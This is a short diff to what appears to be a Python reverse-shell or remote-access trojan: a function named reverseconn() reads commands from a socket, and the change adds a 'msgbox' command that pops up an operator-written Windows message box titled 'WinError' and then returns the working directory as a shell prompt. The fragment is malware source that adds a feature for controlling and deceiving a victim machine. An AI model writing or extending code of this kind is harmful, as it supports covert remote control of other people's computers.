@@ -40,6 +40,12 @@ def reverseconn():
 
             keyinterface(recvcmd[10:].decode("utf-8"))
 
+        elif recvcmd[:6].decode("utf-8")=="msgbox":
+
+            win32api.MessageBox(0,recvcmd[7:].decode("utf-8"),"WinError")
+
+            s.send(str.encode(str(os.getcwd())+'> '))
+
         elif recvcmd.decode("utf-8")=="quit":
 
             break
